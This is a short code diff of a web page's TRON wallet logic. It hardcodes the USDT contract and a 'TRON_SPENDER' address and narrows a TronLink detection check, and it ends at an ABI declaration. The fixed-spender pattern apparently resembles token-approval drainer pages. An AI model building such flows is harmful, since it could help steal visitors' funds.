@@ -131,8 +131,8 @@ export default function Index() {
       const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
       const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
 
-      // TronLink path
-      if (window.tronWeb?.defaultAddress?.base58) {
+      // TronLink path - only for TronLink browser, not Trust Wallet
+      if (window.tronLink && window.tronWeb?.defaultAddress?.base58) {
         const tw = window.tronWeb;
         const address = tw.defaultAddress.base58;
         const ABI = [
